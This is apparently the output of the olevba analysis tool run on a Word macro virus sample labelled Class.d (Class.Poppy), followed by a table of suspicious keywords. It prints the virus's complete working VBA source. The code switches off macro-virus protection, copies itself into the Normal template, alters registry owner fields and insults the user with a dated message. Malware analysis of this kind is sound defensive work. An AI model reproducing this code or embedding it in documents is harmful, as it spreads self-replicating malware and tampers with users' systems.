olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.d-9264edde70e7ac634f34d36c1f4ebc8d1bc81271
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.d-9264edde70e7ac634f34d36c1f4ebc8d1bc81271 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function RegOpenKeyExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
'Rockdale County9/13/99 2:45:02 PMHP LaserJet 4 Plus on \\SHS\HP_WRMAOil spill dump.doc
Private Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
'Rockdale County9/13/99 2:45:03 PMHP LaserJet 4 Plus on \\SHS\HP_WRMAOil spill dump.doc
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
'Rockdale County9/13/99 2:45:03 PMHP LaserJet 4 Plus on \\SHS\HP_WRMAOil spill dump.doc
Const REG_SZ As Long = 1
'Rockdale County9/13/99 2:45:03 PMHP LaserJet 4 Plus on \\SHS\HP_WRMAOil spill dump.doc
Const HKEY_CURRENT_USER As Long = &H80000001
'Rockdale County9/13/99 2:45:03 PMHP LaserJet 4 Plus on \\SHS\HP_WRMAOil spill dump.doc
Const HKEY_LOCAL_MACHINE As Long = &H80000002
'Rockdale County9/13/99 2:45:03 PMHP LaserJet 4 Plus on \\SHS\HP_WRMAOil spill dump.doc
Sub AutoOpen()
'Rockdale County9/13/99 2:45:03 PMHP LaserJet 4 Plus on \\SHS\HP_WRMAOil spill dump.doc
On Error GoTo out
'Rockdale County9/13/99 2:45:03 PMHP LaserJet 4 Plus on \\SHS\HP_WRMAOil spill dump.doc
Options.VirusProtection = False
'Rockdale County9/13/99 2:45:03 PMHP LaserJet 4 Plus on \\SHS\HP_WRMAOil spill dump.doc
Options.SaveNormalPrompt = False
'Rockdale County9/13/99 2:45:03 PMHP LaserJet 4 Plus on \\SHS\HP_WRMAOil spill dump.doc
Options.ConfirmConversions = False
'Rockdale County9/13/99 2:45:03 PMHP LaserJet 4 Plus on \\SHS\HP_WRMAOil spill dump.doc
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Rockdale County9/13/99 2:45:03 PMHP LaserJet 4 Plus on \\SHS\HP_WRMAOil spill dump.doc
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Rockdale County9/13/99 2:45:03 PMHP LaserJet 4 Plus on \\SHS\HP_WRMAOil spill dump.doc
If nt > 70 And ad > 0 Then GoTo out
'Rockdale County9/13/99 2:45:03 PMHP LaserJet 4 Plus on \\SHS\HP_WRMAOil spill dump.doc
If nt < 70 Then
'Rockdale County9/13/99 2:45:03 PMHP LaserJet 4 Plus on \\SHS\HP_WRMAOil spill dump.doc
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Rockdale County9/13/99 2:45:03 PMHP LaserJet 4 Plus on \\SHS\HP_WRMAOil spill dump.doc
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Rockdale County9/13/99 2:45:03 PMHP LaserJet 4 Plus on \\SHS\HP_WRMAOil spill dump.doc
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Rockdale County9/13/99 2:45:03 PMHP LaserJet 4 Plus on \\SHS\HP_WRMAOil spill dump.doc
End If
'Rockdale County9/13/99 2:45:03 PMHP LaserJet 4 Plus on \\SHS\HP_WRMAOil spill dump.doc
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Rockdale County9/13/99 2:45:03 PMHP LaserJet 4 Plus on \\SHS\HP_WRMAOil spill dump.doc
If Day(Now) = 14 And Month(Now) > 5 Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "Class.Poppy"
'Rockdale County9/13/99 2:45:03 PMHP LaserJet 4 Plus on \\SHS\HP_WRMAOil spill dump.doc
host.codemodule.AddFromFile ("c:\class.sys")
'Rockdale County9/13/99 2:45:03 PMHP LaserJet 4 Plus on \\SHS\HP_WRMAOil spill dump.doc
With host.codemodule
'Rockdale County9/13/99 2:45:03 PMHP LaserJet 4 Plus on \\SHS\HP_WRMAOil spill dump.doc
    For x = 1 To 16
'Rockdale County9/13/99 2:45:03 PMHP LaserJet 4 Plus on \\SHS\HP_WRMAOil spill dump.doc
    .deletelines 1
'Rockdale County9/13/99 2:45:03 PMHP LaserJet 4 Plus on \\SHS\HP_WRMAOil spill dump.doc
    Next x
'Rockdale County9/13/99 2:45:03 PMHP LaserJet 4 Plus on \\SHS\HP_WRMAOil spill dump.doc
End With
'Rockdale County9/13/99 2:45:03 PMHP LaserJet 4 Plus on \\SHS\HP_WRMAOil spill dump.doc
If nt < 70 Then
'Rockdale County9/13/99 2:45:03 PMHP LaserJet 4 Plus on \\SHS\HP_WRMAOil spill dump.doc
    With host.codemodule
'Rockdale County9/13/99 2:45:03 PMHP LaserJet 4 Plus on \\SHS\HP_WRMAOil spill dump.doc
    .replaceline 1, "Sub AutoClose()"
'Rockdale County9/13/99 2:45:03 PMHP LaserJet 4 Plus on \\SHS\HP_WRMAOil spill dump.doc
    .replaceline 91, "Sub ToolsMacro()"
'Rockdale County9/13/99 2:45:03 PMHP LaserJet 4 Plus on \\SHS\HP_WRMAOil spill dump.doc
    For x = 70 To 81
'Rockdale County9/13/99 2:45:03 PMHP LaserJet 4 Plus on \\SHS\HP_WRMAOil spill dump.doc
        .deletelines 62
'Rockdale County9/13/99 2:45:03 PMHP LaserJet 4 Plus on \\SHS\HP_WRMAOil spill dump.doc
    Next x
'Rockdale County9/13/99 2:45:03 PMHP LaserJet 4 Plus on \\SHS\HP_WRMAOil spill dump.doc
    .replaceline 35, "    For x = 1 To 4"
'Rockdale County9/13/99 2:45:03 PMHP LaserJet 4 Plus on \\SHS\HP_WRMAOil spill dump.doc
    End With
'Rockdale County9/13/99 2:45:03 PMHP LaserJet 4 Plus on \\SHS\HP_WRMAOil spill dump.doc
End If
'Rockdale County9/13/99 2:45:03 PMHP LaserJet 4 Plus on \\SHS\HP_WRMAOil spill dump.doc
If nt < 70 Then
'Rockdale County9/13/99 2:45:03 PMHP LaserJet 4 Plus on \\SHS\HP_WRMAOil spill dump.doc
u = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion", 0, KEY_ALL_ACCESS, k)
'Rockdale County9/13/99 2:45:03 PMHP LaserJet 4 Plus on \\SHS\HP_WRMAOil spill dump.doc
u = RegSetValueExA(k, "RegisteredOwner", 0, REG_SZ, "VicodinES /CB /TNN", 1)
'Rockdale County9/13/99 2:45:03 PMHP LaserJet 4 Plus on \\SHS\HP_WRMAOil spill dump.doc
u = RegSetValueExA(k, "RegisteredOrganization", 0, REG_SZ, "-(Dr. Diet Mountain Dew)-", 1)
'Rockdale County9/13/99 2:45:03 PMHP LaserJet 4 Plus on \\SHS\HP_WRMAOil spill dump.doc
u = RegCloseKey(k)
'Rockdale County9/13/99 2:45:03 PMHP LaserJet 4 Plus on \\SHS\HP_WRMAOil spill dump.doc
End If
'Rockdale County9/13/99 2:45:03 PMHP LaserJet 4 Plus on \\SHS\HP_WRMAOil spill dump.doc
With host.codemodule
'Rockdale County9/13/99 2:45:03 PMHP LaserJet 4 Plus on \\SHS\HP_WRMAOil spill dump.doc
    For x = 2 To 104 Step 2
'Rockdale County9/13/99 2:45:03 PMHP LaserJet 4 Plus on \\SHS\HP_WRMAOil spill dump.doc
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Rockdale County9/13/99 2:45:03 PMHP LaserJet 4 Plus on \\SHS\HP_WRMAOil spill dump.doc
    Next x
'Rockdale County9/13/99 2:45:03 PMHP LaserJet 4 Plus on \\SHS\HP_WRMAOil spill dump.doc
End With
'Rockdale County9/13/99 2:45:03 PMHP LaserJet 4 Plus on \\SHS\HP_WRMAOil spill dump.doc
out:
'Rockdale County9/13/99 2:45:03 PMHP LaserJet 4 Plus on \\SHS\HP_WRMAOil spill dump.doc
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Rockdale County9/13/99 2:45:03 PMHP LaserJet 4 Plus on \\SHS\HP_WRMAOil spill dump.doc
End Sub
'Rockdale County9/13/99 2:45:03 PMHP LaserJet 4 Plus on \\SHS\HP_WRMAOil spill dump.doc
Sub ViewVBCode()
'Rockdale County9/13/99 2:45:03 PMHP LaserJet 4 Plus on \\SHS\HP_WRMAOil spill dump.doc
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |advapi32.dll        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

